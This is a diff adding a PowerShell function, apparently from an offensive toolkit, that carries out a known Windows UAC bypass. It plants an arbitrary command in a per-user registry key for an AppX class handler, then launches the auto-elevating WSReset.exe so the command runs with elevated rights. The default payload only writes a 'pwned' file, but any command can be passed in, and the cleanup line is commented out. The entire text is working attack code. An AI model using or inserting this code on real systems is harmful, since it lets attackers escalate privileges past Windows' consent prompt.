@@ -1,0 +1,25 @@
+function invoke-wsreset{ 
+                        Param (     
+                            $instruction = "c:\windows\system32\windowspowershell\\v1.0\powershell.exe -C echo pwned > c:\iBombShell.txt" 
+                        )
+
+                        $path = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
+                        $key = "DelegateExecute" 
+                        
+                        # Creating path
+                        if(-not(Test-Path -Path $path))
+                        {
+                            New-Item $path -Force
+                        
+                        }
+
+                        # Registry values
+                        New-ItemProperty -Path $path -Name $key -Value "" -Force
+                        Set-ItemProperty -Path $path -Name "(default)" -Value $instruction -Force
+                        
+                         WSReset.exe
+
+                        Sleep 2
+                        # Removing
+                        #rm -Force -Recurse $path
+                    }
